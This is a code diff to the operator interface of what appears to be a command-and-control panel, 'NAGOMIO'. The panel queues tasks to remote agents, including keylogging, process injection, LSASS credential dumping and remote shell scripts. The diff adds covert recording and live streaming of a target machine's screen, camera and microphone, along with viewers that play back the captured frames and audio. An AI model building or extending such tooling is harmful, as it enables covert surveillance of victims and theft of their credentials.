@@ -1,9 +1,29 @@
 import React, { useEffect, useMemo, useState } from "react";
 import { FaFolderOpen, FaLaptopCode, FaStream, FaTerminal, FaTrash } from "react-icons/fa";
+import { WebviewWindow } from "@tauri-apps/api/webviewWindow";
 import { FileBrowser } from "../components/FileBrowser";
 import { useAppState, statusClass, unixTime, TaskRecord } from "../components/AppContext";
 import { platformFromAgentOs } from "../lib/commandCatalog";
 import { helpText, parseConsoleCommand } from "../lib/consoleCommands";
+
+function useLiveStreamAutoClose(liveStreams: Record<string, { agentId: string; taskId: string; type: string }>, tasks: TaskRecord[], setLiveStreams: React.Dispatch<React.SetStateAction<Record<string, { agentId: string; taskId: string; type: string }>>>, setMessage: (v: string) => void) {
+  useEffect(() => {
+    let cancelled = false;
+    (async () => {
+      for (const meta of Object.values(liveStreams)) {
+        const task = tasks.find((t) => t.task.task_id === meta.taskId);
+        if (!task) continue;
+        if (task.status === "completed" || task.status === "failed") {
+          try { (await WebviewWindow.getByLabel(`live-${meta.taskId}`))?.close(); } catch { /* ignore */ }
+          if (cancelled) return;
+          setLiveStreams((prev) => { const n = { ...prev }; delete n[meta.taskId]; return n; });
+          setMessage(`live ${meta.type.replace("stream_", "")} stream ended`);
+        }
+      }
+    })();
+    return () => { cancelled = true; };
+  }, [tasks, liveStreams, setLiveStreams, setMessage]);
+}
 
 type SessionTab = "console" | "files";
 type LocalConsoleEntry = {
@@ -19,7 +39,7 @@ type AgentMenu = {
 } | null;
 
 export function Agents() {
-  const { agents, tasks, responses, api, refresh, setMessage, loading, setLoading } = useAppState();
+  const { agents, tasks, responses, api, refresh, setMessage, loading, setLoading, baseUrl, apiToken } = useAppState();
   const [selectedAgent, setSelectedAgent] = useState("");
   const [consoleInput, setConsoleInput] = useState("");
   const [localEntries, setLocalEntries] = useState<LocalConsoleEntry[]>([
@@ -29,6 +49,7 @@ export function Agents() {
   const [activeTab, setActiveTab] = useState<SessionTab>("console");
   const [pendingUploadPath, setPendingUploadPath] = useState("");
   const [agentMenu, setAgentMenu] = useState<AgentMenu>(null);
+  const [liveStreams, setLiveStreams] = useState<Record<string, { agentId: string; taskId: string; type: string }>>({});
 
   const activeAgent = useMemo(
     () => agents.find((agent) => agent.registration.agent_id === selectedAgent),
@@ -40,6 +61,7 @@ export function Agents() {
     .filter((task) => task.agent_id === selectedAgent)
     .sort((left, right) => left.created_at_unix - right.created_at_unix);
   const visibleAgentTasks = agentTasks.filter((task) => task.created_at_unix >= consoleClearedAt);
+  useLiveStreamAutoClose(liveStreams, tasks, setLiveStreams, setMessage);
   function remoteCommandLabel(task: TaskRecord): string {
     if (task.task.command === "sh" || task.task.command === "powershell.exe") {
       const script = task.task.arguments[task.task.arguments.length - 1] || task.task.command;
@@ -65,6 +87,13 @@ export function Agents() {
     if (task.task.command === "keylog") return `keylog ${task.task.arguments[0] || ""}`;
     if (task.task.command === "inject") return `inject ${task.task.arguments[0] || ""} ${(task.task.arguments[1] || "").slice(0, 24)}…`;
     if (task.task.command === "lsass") return "lsass";
+    if (task.task.command === "record_display") return `record display ${task.task.arguments.slice(0, 3).join(" ") || ""}`;
+    if (task.task.command === "record_camera") return `record camera ${task.task.arguments.slice(0, 3).join(" ") || ""}`;
+    if (task.task.command === "record_mic") return `record mic ${task.task.arguments[0] || ""}`;
+    if (task.task.command === "stream_display") return "stream display (live)";
+    if (task.task.command === "stream_camera") return "stream camera (live)";
+    if (task.task.command === "stream_mic") return "stream mic (live)";
+    if (task.task.command === "stream_stop") return "stream stop";
     return [task.task.command, ...task.task.arguments].join(" ");
   }
   const eventItems = [
@@ -101,7 +130,7 @@ export function Agents() {
     ]);
   }
 
-  async function queueAgentTask(command: string, args: string[], label: string) {
+  async function queueAgentTask(command: string, args: string[], label: string, liveType?: string) {
     if (!command.trim()) return;
     if (!selectedAgent) {
       appendLocalEntry(label, "select an agent from the table before sending remote commands");
@@ -109,17 +138,23 @@ export function Agents() {
     }
     setLoading(true);
     try {
+      const taskId = `task-${Date.now()}`;
       await api<TaskRecord>("/api/tasks", {
         method: "POST",
         body: JSON.stringify({
           agent_id: selectedAgent,
           task: {
-            task_id: `task-${Date.now()}`,
+            task_id: taskId,
             command,
             arguments: args
           }
         })
       });
+      if (liveType) {
+        const meta = { agentId: selectedAgent, taskId, type: liveType };
+        setLiveStreams((prev) => ({ ...prev, [taskId]: meta }));
+        openLiveStreamWindow(meta, baseUrl, apiToken);
+      }
       await refresh();
       setMessage(`${label} sent to ${selectedAgent}`);
     } catch (error) {
@@ -127,6 +162,54 @@ export function Agents() {
     } finally {
       setLoading(false);
     }
+  }
+
+  async function stopLiveStream(taskId: string) {
+    const meta = liveStreams[taskId];
+    if (!meta) return;
+    try {
+      await api<TaskRecord>("/api/tasks", {
+        method: "POST",
+        body: JSON.stringify({
+          agent_id: meta.agentId,
+          task: { task_id: `task-${Date.now()}`, command: "stream_stop", arguments: [] }
+        })
+      });
+      setMessage(`stream stop sent to ${meta.agentId}`);
+    } catch (error) {
+      setMessage(error instanceof Error ? error.message : "stop failed");
+    }
+    try {
+      (await WebviewWindow.getByLabel(`live-${taskId}`))?.close();
+    } catch { /* ignore */ }
+    setLiveStreams((prev) => {
+      const next = { ...prev };
+      delete next[taskId];
+      return next;
+    });
+    await refresh();
+  }
+
+  function openLiveStreamWindow(meta: { agentId: string; taskId: string; type: string }, base: string, token: string) {
+    const label = `live-${meta.taskId}`;
+    const params = new URLSearchParams({
+      agentId: meta.agentId,
+      taskId: meta.taskId,
+      type: meta.type,
+      baseUrl: base,
+      token: token,
+    });
+    const url = `${window.location.origin}/live?${params.toString()}`;
+    const win = new WebviewWindow(label, {
+      url,
+      title: `NAGOMIO · Live ${meta.type.replace("stream_", "")} · ${meta.taskId.slice(0, 12)}`,
+      width: 760,
+      height: 560,
+      resizable: true,
+      minimizable: true,
+      maximizable: true,
+    });
+    win.once("tauri://error", (e) => setMessage(`live window error: ${String((e as { payload?: unknown }).payload)}`));
   }
 
   async function removeAgent(agentId: string) {
@@ -176,7 +259,9 @@ export function Agents() {
       appendLocalEntry(input, `select a local file to upload to ${result.remotePath}`);
       return;
     }
-    await queueAgentTask(result.task.command, result.task.arguments, result.label);
+    const liveTypes = ["stream_display", "stream_camera", "stream_mic"];
+    const liveType = liveTypes.includes(result.task.command) ? result.task.command : undefined;
+    await queueAgentTask(result.task.command, result.task.arguments, result.label, liveType);
   }
 
   async function uploadFromConsole(event: React.ChangeEvent<HTMLInputElement>) {
@@ -206,10 +291,13 @@ export function Agents() {
     const response = responseFor(task.task.task_id);
     if (!response) return "waiting for response...";
 
-    try {
+     try {
       const parsed = JSON.parse(response.output);
       if (parsed.type === "screenshot_bmp") {
         return `Screenshot ${parsed.width}×${parsed.height} (${parsed.size} bytes)\nSaved to ${parsed.saved_path}`;
+      }
+      if (parsed.type === "stream_started") {
+        return `Live stream started (${parsed.type}). Frames are shown in the live viewer above and saved to artifacts when you click Stop.`;
       }
       if (parsed.type === "file_download") {
         return `Downloaded ${parsed.remote_path}\nSaved to ${parsed.saved_path}\nSize: ${parsed.size} bytes`;
@@ -420,6 +508,13 @@ type ParsedResponse = {
   source?: string;
   destination?: string;
   removed?: number;
+  duration_s?: number;
+  fps?: number;
+  frame_count?: number;
+  elapsed_ms?: number;
+  sample_rate?: number;
+  channels?: number;
+  bits_per_sample?: number;
   [key: string]: unknown;
 };
 
@@ -427,50 +522,122 @@ function TaskOutputView({ task, parsed, fallback }: { task: TaskRecord; parsed: 
   const { apiBlob } = useAppState();
   const [imageUrl, setImageUrl] = useState<string | null>(null);
   const [imageError, setImageError] = useState<string | null>(null);
+  const [audioUrl, setAudioUrl] = useState<string | null>(null);
+  const [streamFrames, setStreamFrames] = useState<string[] | null>(null);
+  const [currentFrame, setCurrentFrame] = useState(0);
+  const [streamError, setStreamError] = useState<string | null>(null);
 
   const isScreenshot = parsed?.type === "screenshot_bmp" && typeof parsed.saved_path === "string";
+  const isStreamVideo = (parsed?.type === "stream_display" || parsed?.type === "stream_camera" || parsed?.type === "record_display" || parsed?.type === "record_camera") && typeof parsed.saved_path === "string";
+  const isStreamAudio = (parsed?.type === "stream_mic" || parsed?.type === "record_mic") && typeof parsed.saved_path === "string";
+  const playbackFps = (() => {
+    const frames = typeof parsed?.frame_count === "number" ? parsed.frame_count : 0;
+    const elapsedMs = typeof parsed?.elapsed_ms === "number" ? parsed.elapsed_ms : 0;
+    if (frames > 0 && elapsedMs > 0) return frames / (elapsedMs / 1000);
+    const fps = typeof parsed?.fps === "number" ? parsed.fps : 0;
+    if (fps > 0) return fps;
+    const duration = typeof parsed?.duration_s === "number" ? parsed.duration_s : 0;
+    if (frames > 0 && duration > 0) return frames / duration;
+    return 10;
+  })();
+
   const artifactKey = useMemo(() => {
-    if (!isScreenshot) return null;
+    if (!isScreenshot && !isStreamVideo && !isStreamAudio) return null;
     const saved = String(parsed!.saved_path);
     const segments = saved.split(/[\\/]/).filter(Boolean);
-    const filename = segments.pop() || "screenshot.bmp";
+    const filename = segments.pop() || "unknown";
     const taskId = segments.pop() || task.task.task_id;
     const agentId = segments.pop() || task.agent_id;
     return `/api/artifacts/${encodeURIComponent(agentId)}/${encodeURIComponent(taskId)}/${encodeURIComponent(filename)}`;
-  }, [isScreenshot, parsed, task.task.task_id, task.agent_id]);
+  }, [isScreenshot, isStreamVideo, isStreamAudio, parsed, task.task.task_id, task.agent_id]);
 
   useEffect(() => {
     if (!artifactKey) {
-      setImageUrl((prev) => {
-        if (prev) URL.revokeObjectURL(prev);
-        return null;
-      });
+      setImageUrl((prev) => { if (prev) URL.revokeObjectURL(prev); return null; });
+      setAudioUrl((prev) => { if (prev) URL.revokeObjectURL(prev); return null; });
+      setStreamFrames(null);
+      setCurrentFrame(0);
       setImageError(null);
+      setStreamError(null);
       return;
     }
     let cancelled = false;
-    setImageError(null);
-    apiBlob(artifactKey)
-      .then((blob) => {
-        if (cancelled) return;
-        setImageUrl((prev) => {
-          if (prev) URL.revokeObjectURL(prev);
-          return URL.createObjectURL(blob);
+
+    if (isStreamVideo) {
+      setStreamError(null);
+      apiBlob(artifactKey)
+        .then(async (blob) => {
+          if (cancelled) return;
+          const buf = await blob.arrayBuffer();
+          const view = new DataView(buf);
+          let off = 0;
+          const magic = String.fromCharCode(...new Uint8Array(buf, off, 4));
+          off += 4;
+          if (magic !== "MJPF") {
+            setStreamError("invalid MJPEG stream");
+            return;
+          }
+          const frameCount = view.getUint32(off, false); off += 4;
+          const width = view.getUint32(off, false); off += 4;
+          const height = view.getUint32(off, false); off += 4;
+          const frames: string[] = [];
+          for (let i = 0; i < frameCount && off < buf.byteLength; i++) {
+            const size = view.getUint32(off, false); off += 4;
+            const jpegBytes = new Uint8Array(buf, off, size);
+            off += size;
+            const blob = new Blob([jpegBytes], { type: "image/jpeg" });
+            const url = URL.createObjectURL(blob);
+            frames.push(url);
+          }
+          if (cancelled) { frames.forEach((u) => URL.revokeObjectURL(u)); return; }
+          setStreamFrames(frames);
+          setCurrentFrame(0);
+        })
+        .catch((err: Error) => {
+          if (cancelled) return;
+          setStreamError(err.message || "failed to load stream");
         });
-      })
-      .catch((err: Error) => {
-        if (cancelled) return;
-        setImageError(err.message || "failed to load screenshot");
-      });
-    return () => {
-      cancelled = true;
-    };
-  }, [artifactKey, apiBlob]);
+    } else if (isStreamAudio) {
+      setStreamError(null);
+      apiBlob(artifactKey)
+        .then((blob) => {
+          if (cancelled) return;
+          setAudioUrl((prev) => { if (prev) URL.revokeObjectURL(prev); return URL.createObjectURL(blob); });
+        })
+        .catch((err: Error) => {
+          if (cancelled) return;
+          setStreamError(err.message || "failed to load audio");
+        });
+    } else {
+      setImageError(null);
+      apiBlob(artifactKey)
+        .then((blob) => {
+          if (cancelled) return;
+          setImageUrl((prev) => { if (prev) URL.revokeObjectURL(prev); return URL.createObjectURL(blob); });
+        })
+        .catch((err: Error) => {
+          if (cancelled) return;
+          setImageError(err.message || "failed to load screenshot");
+        });
+    }
+
+    return () => { cancelled = true; };
+  }, [artifactKey, apiBlob, isStreamVideo, isStreamAudio, isScreenshot]);
+
+  useEffect(() => {
+    if (!streamFrames || streamFrames.length === 0) return;
+    const interval = window.setInterval(() => {
+      setCurrentFrame((prev) => (prev + 1) % streamFrames.length);
+    }, Math.max(1, 1000 / playbackFps));
+    return () => window.clearInterval(interval);
+  }, [streamFrames, playbackFps]);
 
   useEffect(() => {
     return () => {
-      setImageUrl((prev) => {
-        if (prev) URL.revokeObjectURL(prev);
+      setImageUrl((prev) => { if (prev) URL.revokeObjectURL(prev); return null; });
+      setAudioUrl((prev) => { if (prev) URL.revokeObjectURL(prev); return null; });
+      setStreamFrames((prev) => {
+        if (prev) prev.forEach((u) => URL.revokeObjectURL(u));
         return null;
       });
     };
@@ -489,6 +656,54 @@ function TaskOutputView({ task, parsed, fallback }: { task: TaskRecord; parsed: 
           </a>
         ) : imageError ? null : (
           <div className="task-output-loading">loading screenshot…</div>
+        )}
+      </div>
+    );
+  }
+
+  if (isStreamVideo) {
+    const duration = (() => {
+      if (typeof parsed!.duration_s === "number" && parsed!.duration_s > 0) return `${parsed!.duration_s}s`;
+      if (typeof parsed!.elapsed_ms === "number" && parsed!.elapsed_ms > 0) return `${(parsed!.elapsed_ms / 1000).toFixed(1)}s`;
+      return `${(Number(parsed!.frame_count || 0) / playbackFps).toFixed(1)}s`;
+    })();
+    return (
+      <div className="task-output-screenshot">
+        <div className="task-output-screenshot-meta">
+          {parsed!.width}×{parsed!.height} · {duration} @ {playbackFps.toFixed(1)}fps · {parsed!.frame_count} frames · {parsed!.size} bytes · saved to <code>{String(parsed!.saved_path)}</code>
+        </div>
+        {streamError ? <div className="task-output-error">{streamError}</div> : null}
+        {streamFrames && streamFrames.length > 0 ? (
+          <div style={{ position: "relative" }}>
+            <img
+              className="task-output-image"
+              src={streamFrames[currentFrame]}
+              alt={`stream frame ${currentFrame + 1}/${streamFrames.length}`}
+            />
+            <div style={{ marginTop: 4, fontSize: 11, color: "#888" }}>
+              frame {currentFrame + 1}/{streamFrames.length}
+            </div>
+          </div>
+        ) : streamError ? null : (
+          <div className="task-output-loading">loading stream frames…</div>
+        )}
+      </div>
+    );
+  }
+
+  if (isStreamAudio) {
+    return (
+      <div className="task-output-screenshot">
+        <div className="task-output-screenshot-meta">
+          {parsed!.duration_s}s · {parsed!.sample_rate}Hz · {parsed!.channels}ch · {parsed!.bits_per_sample}bit · {parsed!.size} bytes · saved to <code>{String(parsed!.saved_path)}</code>
+        </div>
+        {streamError ? <div className="task-output-error">{streamError}</div> : null}
+        {audioUrl ? (
+          <audio controls style={{ marginTop: 8, width: "100%", maxWidth: 480 }}>
+            <source src={audioUrl} type="audio/wav" />
+          </audio>
+        ) : streamError ? null : (
+          <div className="task-output-loading">loading audio…</div>
         )}
       </div>
     );
